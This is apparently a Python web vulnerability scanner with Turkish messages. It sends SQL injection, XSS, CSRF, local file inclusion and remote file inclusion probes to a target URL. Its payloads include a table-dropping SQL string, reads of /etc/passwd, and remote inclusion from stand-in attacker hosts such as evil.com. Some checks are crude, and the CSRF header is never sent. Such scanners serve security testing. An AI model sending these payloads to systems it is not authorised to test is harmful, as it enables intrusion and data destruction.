import requests

__all__ = ["test_sql_injection", "test_xss", "test_csrf", "test_lfi", "test_rfi"]

def send_request(url):
    """URL'ye HTTP isteği gönderir ve hataları yakalar."""
    try:
        if not url.startswith("http"):
            url = "http://" + url  

        response = requests.get(url)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[X] Hata: {e}")
        return None

def test_sql_injection(url):
    """SQL Injection testlerini çalıştırır."""
    payloads = ["' OR '1'='1", "'; DROP TABLE users --"]
    results = []

    for payload in payloads:
        test_url = f"{url}&payload={payload}"
        response = send_request(test_url)

        if response and ("error" in response.text.lower() or "mysql" in response.text.lower()):
            results.append(f"[!] Güvenlik Açığı Bulundu: SQL Injection - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results

def test_xss(url):
    """XSS açıklarını test eder."""
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    results = []

    for payload in payloads:
        test_url = f"{url}&payload={payload}"
        response = send_request(test_url)

        if response and "<script>" in response.text.lower():
            results.append(f"[!] Güvenlik Açığı Bulundu: XSS - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results

def test_csrf(url):
    """CSRF güvenlik açığını analiz eder."""
    headers = {"Referer": "evil.com"}
    response = send_request(url)
    results = []

    if response and "csrf_token" not in response.text.lower():
        results.append(f"[!] Güvenlik Açığı Bulundu: CSRF - {url}")
    else:
        results.append(f"[✓] Güvenli: {url}")

    return results

def test_lfi(url):
    """LFI (Local File Inclusion) açıklarını test eder."""
    payloads = ["../../etc/passwd", "../../var/log/syslog", "../index.php"]
    results = []

    for payload in payloads:
        test_url = f"{url}&file={payload}"
        response = send_request(test_url)

        if response and "root:x:" in response.text:
            results.append(f"[!] Güvenlik Açığı Bulundu: LFI - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results

def test_rfi(url):
    """RFI (Remote File Inclusion) açıklarını test eder."""
    payloads = ["http://evil.com/malicious.txt", "http://attacker.com/shell.php"]
    results = []

    for payload in payloads:
        test_url = f"{url}&file={payload}"
        response = send_request(test_url)

        if response and "malicious_code" in response.text:
            results.append(f"[!] Güvenlik Açığı Bulundu: RFI - {test_url}")
        else:
            results.append(f"[✓] Güvenli: {test_url}")

    return results

def run_tests(url):
    """Tüm güvenlik testlerini çalıştıran ana fonksiyon."""
    sql_results = test_sql_injection(url)
    xss_results = test_xss(url)
    csrf_results = test_csrf(url)
    lfi_results = test_lfi(url)
    rfi_results = test_rfi(url)

    return sql_results + xss_results + csrf_results + lfi_results + rfi_results
